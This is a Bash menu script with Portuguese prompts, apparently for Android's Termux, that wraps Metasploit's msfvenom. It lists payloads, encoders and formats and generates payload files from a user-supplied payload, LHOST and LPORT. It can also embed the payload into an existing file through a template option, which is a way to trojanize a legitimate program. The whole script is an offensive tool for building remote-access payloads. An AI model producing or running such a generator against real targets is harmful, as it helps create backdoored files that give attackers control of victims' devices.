#!/bin/bash
while true
do
  echo "||====================================||"
  echo "||====================================||"
  echo "|| ||"
  echo "|| 1) Listar ||"
  echo "|| 2) Executar msfvenom ||"
  echo "|| 3) Abrir o metasploit ||"
  echo "|| ||"
  echo "|| 0) Sair ||"
  echo "||====================================||"
  echo "||====================================||"
  read r;
  if [ "$r" == "0" ]; then
    exit
  elif [ "$r" == "1" ]; then
    while true
    do
      echo "||====================================||"
      echo "||====================================||"
      echo "|| ||"
      echo "|| 1) Encoder ||"
      echo "|| 2) Payload ||"
      echo "|| 3) Format ||"
      echo "|| 0) Sair ||"
      echo "|| ||"
      echo "||====================================||"
      echo "||====================================||"
      read t;
      if [ "$t" == "0" ]; then
        break
      elif [ "$t" == "1" ]; then
        /data/data/com.termux/files/home/tool/metasploit-framework/msfvenom -l encoder
      elif [ "$t" == "2" ]; then
        /data/data/com.termux/files/home/tool/metasploit-framework/msfvenom -l payload
      elif [ "$t" == "3" ]; then
        /data/data/com.termux/files/home/tool/metasploit-framework/msfvenom -l format
      fi
    done
  elif [ "$r" == "2" ]; then
    echo "Digite o payload:"
    read lin;
    echo "Digite o LHOST:"
    read host;
    echo "Digite o LPORT:"
    read port;
    echo "Digite o formato de arquivo:"
    read form;
    echo "Digite o nome do arquivo:"
    read name;
    echo "Deseja usar o template? [y/n]"
    read resp;
    if [ "$resp" == "n" ]; then
      /data/data/com.termux/files/home/tool/metasploit-framework/msfvenom -p $lin LHOST=$host LPORT=$port -f $form > $name.$form
    elif [ "$resp" == "y" ]; then
      echo "Digite o caminho do arquivo:"
      read arq;
      /data/data/com.termux/files/home/tool/metasploit-framework/msfvenom -x $arq -p $lin LHOST=$host LPORT=$port -f $form > $name.$form
    fi
  elif [ "$r" == "3" ]; then
    # Coloque aqui o código para abrir o metasploit
    echo "Abrindo o Metasploit..."
  else
    echo "Comando não encontrado!!!"
  fi
done
